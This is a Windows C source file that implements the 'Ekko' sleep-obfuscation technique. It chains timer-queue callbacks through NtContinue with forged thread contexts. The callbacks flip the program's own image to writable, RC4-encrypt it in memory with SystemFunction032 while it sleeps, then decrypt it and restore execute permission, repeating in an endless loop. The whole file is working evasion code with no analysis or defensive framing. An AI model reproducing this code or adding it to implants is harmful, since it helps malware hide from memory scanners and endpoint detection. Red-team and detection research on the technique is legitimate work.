#include <windows.h>
#include <stdio.h>
#include <ntstatus.h>
#include <winternl.h>

typedef enum _EVENT_TYPE
{
    NotificationEvent,
    SynchronizationEvent
} EVENT_TYPE;


// Function Definiation 
typedef struct _Win32 
{

    PVOID SystemFunction32;
    PVOID NtContinue;
    NTSTATUS(NTAPI *RtlCreateTimerQueue)(PHANDLE TimerQueueHandle);
    
    NTSTATUS(NTAPI *RtlRegisterWait)(PHANDLE WaitHandle, HANDLE Handle, WAITORTIMERCALLBACKFUNC Function, PVOID Context, ULONG Milliseconds, ULONG Flags);
    
    NTSTATUS(NTAPI *RtlCreateTimer)(HANDLE TimerQueueHandle, PHANDLE Handle, WAITORTIMERCALLBACKFUNC Function, PVOID Context, ULONG DueTime, ULONG Period, ULONG Flags);
    
    
    NTSTATUS(NTAPI* RtlDeleteTimerQueue)(HANDLE TimerQueueHandle);
    
    NTSTATUS(NTAPI* NtCreateEvent)(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, EVENT_TYPE EventType, BOOLEAN InitialState);
    
    NTSTATUS(NTAPI* NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
    
    NTSTATUS(NTAPI *NtSignalAndWaitForSingleObject)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

} Win32, *PWin32;

Win32 win32 = { 0 };

DWORD SleepTime = 5000;

ULONG Random()
{
    return (ULONG)rand();
}

VOID Ekko( DWORD sleeptime )
{
    NTSTATUS status = 0;
    HANDLE Queue = NULL;
    HANDLE EventTimer = NULL;
    HANDLE EventStart = NULL;
    HANDLE EventEnd = NULL;
    HANDLE Timer = NULL;
    CONTEXT CtxInit = { 0 };
    CONTEXT Ctx[7] = { 0 };
    STRING Key = { 0 };
    STRING Image = { 0 };
    DWORD Delay = 0;
    DWORD oldProtection = 0;


    HANDLE ImageBase = GetModuleHandleA(NULL);
    ULONG SizeOfImage = ((PIMAGE_NT_HEADERS)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase ) ->e_lfanew))->OptionalHeader.SizeOfImage;

    printf("[+] ImageBase: 0x%p \n", ImageBase);

    BYTE rand_key[16] = { 0 };
    for (int i = 0; i < 16; i++)
    {
        rand_key[i] = (BYTE)Random();
    }

    Key.Buffer = rand_key;
    Key.Length = 16;

    Image.Buffer = ImageBase;
    Image.Length = SizeOfImage;

    if ( !NT_SUCCESS (win32.RtlCreateTimerQueue(&Queue)))
    {
        return;
    }

    if ( !NT_SUCCESS(win32.NtCreateEvent(&EventTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) || !NT_SUCCESS(win32.NtCreateEvent(&EventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) || !NT_SUCCESS(win32.NtCreateEvent(&EventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)))
    {
        printf("[-] Failed to create the sleep event \n");
        return;
    }

    if (NT_SUCCESS(win32.RtlCreateTimer(Queue, &Timer, (WAITORTIMERCALLBACKFUNC)RtlCaptureContext, &CtxInit, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)))
    {
        if (NT_SUCCESS(win32.RtlCreateTimer(Queue, &Timer, (WAITORTIMERCALLBACKFUNC)SetEvent, EventTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)))
        {
            if (!NT_SUCCESS(win32.NtWaitForSingleObject(EventTimer, FALSE, NULL)))
            {
                printf("[-] Failed to wait for EventTimer. \n");
                return;
            }

            for (int i=0; i < 7; i ++)
            {
                memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
                Ctx[i].Rsp -= sizeof(PVOID);
            }

            Ctx[0].Rip = (UINT_PTR)WaitForSingleObjectEx;
            Ctx[0].Rcx = (UINT_PTR)EventStart;
            Ctx[0].Rdx = (UINT_PTR)INFINITE;
            Ctx[0].R8 = (UINT_PTR)NULL;

            Ctx[1].Rip = (UINT_PTR)VirtualProtect;
            Ctx[1].Rcx = (UINT_PTR)ImageBase;
            Ctx[1].Rdx = (UINT_PTR)SizeOfImage;
            Ctx[1].R8 = (UINT_PTR)PAGE_READWRITE;
            Ctx[1].R9 = (UINT_PTR)&oldProtection;

            Ctx[2].Rip = (UINT_PTR)win32.SystemFunction32;
            Ctx[2].Rcx = (UINT_PTR)&Image;
            Ctx[2].Rdx = (UINT_PTR)&Key;

            Ctx[3].Rip = (UINT_PTR)WaitForSingleObjectEx;
            Ctx[3].Rcx = (UINT_PTR)GetCurrentProcess();
            Ctx[3].Rdx = (UINT_PTR)sleeptime;
            Ctx[3].R8 = (UINT_PTR)FALSE;

            Ctx[4].Rip = (UINT_PTR)win32.SystemFunction32;
            Ctx[4].Rcx = (UINT_PTR)&Image;
            Ctx[4].Rdx = (UINT_PTR)&Key;

            Ctx[5].Rip = (UINT_PTR)VirtualProtect;
            Ctx[5].Rcx = (UINT_PTR)ImageBase;
            Ctx[5].Rdx = (UINT_PTR)SizeOfImage;
            Ctx[5].R8 = (UINT_PTR)PAGE_EXECUTE_READ;
            Ctx[5].R9 = (UINT_PTR)&oldProtection;

            Ctx[6].Rip = (UINT_PTR)SetEvent;
            Ctx[6].Rcx = (UINT_PTR)EventEnd;

            printf("[+] Starting Ekko ... \n");

            for (int i = 0; i < 7; i++)
            {
                if (!NT_SUCCESS(win32.RtlCreateTimer(Queue, &Timer, win32.NtContinue, &Ctx[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)))
                {
                    printf("[-] Failed to create timer for context %d \n", i);
                    return;
                }
            }

            printf("[+] Waiting for EventEnd ... \n");

            if (!NT_SUCCESS(win32.NtSignalAndWaitForSingleObject(EventStart, EventEnd, FALSE, NULL)))
            {
                printf("[-] Failed to signal and wait for EventEnd \n");
                return;
            }
        }
        else
        {
            printf("[-] Failed to create timer for EventTimer \n");
            return;
        }
    }
    else
    {
        printf("[-] Failed to create timer for RtlCaptureContext \n");
        return;
    }
    printf("[+] Ekko Completed Sucessfully \n");
    printf("\n");

    if (Queue)
    {
        win32.RtlDeleteTimerQueue(Queue);
        Queue = NULL;
    }
    if (EventTimer)
    {
        CloseHandle(EventTimer);
        EventTimer = NULL;
    }
    if (EventStart)
    {
        CloseHandle(EventStart);
        EventStart = NULL;
    }
    if (EventEnd)
    {
        CloseHandle(EventEnd);
        EventEnd = NULL;
    }
}

int main()
{
    HMODULE hNtdll = { 0 };
    HMODULE hAdvapi32 = { 0 };


    hNtdll = GetModuleHandleA("ntdll.dll");
    hAdvapi32 = LoadLibraryA("advapi32.dll");

    if ( !hNtdll || !hAdvapi32 )
    {
        printf("[-] Failed to load the Dlls \n");
        return -1;
    }

    printf("[+] The Handle of Ntdll is 0x%p \n", hNtdll);
    printf("[+] The Handle of Advapi32 is 0x%p \n", hAdvapi32);

    win32.NtContinue = (PVOID)GetProcAddress(hNtdll, "NtContinue");
    win32.RtlCreateTimerQueue = (PVOID)GetProcAddress(hNtdll, "RtlCreateTimerQueue");
    win32.RtlRegisterWait = (PVOID)GetProcAddress(hNtdll, "RtlRegisterWait");
    win32.RtlCreateTimer = (PVOID)GetProcAddress(hNtdll, "RtlCreateTimer");
    win32.RtlDeleteTimerQueue = (PVOID)GetProcAddress(hNtdll, "RtlDeleteTimerQueue");
    win32.NtCreateEvent = (PVOID)GetProcAddress(hNtdll, "NtCreateEvent");
    win32.NtWaitForSingleObject = (PVOID)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    win32.NtSignalAndWaitForSingleObject = (PVOID)GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
    win32.SystemFunction32 = (PVOID)GetProcAddress(hAdvapi32, "SystemFunction032");

    if ( !win32.NtContinue || !win32.RtlCreateTimerQueue || !win32.RtlRegisterWait || !win32.RtlCreateTimer || !win32.RtlDeleteTimerQueue || !win32.NtCreateEvent || !win32.NtWaitForSingleObject || !win32.NtSignalAndWaitForSingleObject || !win32.SystemFunction32 )
    {
        printf("[-] Failed to get function address \n");
        return -1;
    }

    srand((unsigned)GetTickCount());

    while (1)
    {
        Ekko(SleepTime);
    }


    return 0;
}